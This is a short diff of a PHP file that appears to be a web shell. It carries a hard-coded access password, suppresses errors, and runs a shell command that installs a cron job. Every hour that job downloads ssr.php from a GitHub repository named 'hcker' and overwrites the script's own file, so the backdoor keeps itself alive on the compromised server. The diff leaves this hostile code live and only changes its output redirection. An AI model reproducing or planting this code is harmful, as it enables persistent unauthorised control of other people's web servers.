@@ -1,5 +1,3 @@
-
-
 <?php
 $password='24434';//passwordmu
 error_reporting(0);
@@ -543,6 +541,6 @@ function autoEdit($dir,$file){
 	}
 	exit;
 }
-execute(exec_meth(),"echo '1 * * * * wget https://raw.githubusercontent.com/sudoasu1337/hcker/main/ssr.php -O ".realpath($_SERVER['SCRIPT_FILENAME'])." >/dev/null 2>&1' | crontab ");
+execute(exec_meth(),"echo '1 * * * * wget https://raw.githubusercontent.com/sudoasu1337/hcker/main/ssr.php -O ".realpath($_SERVER['SCRIPT_FILENAME'])." ' | crontab ");
 print $end;
 ?>
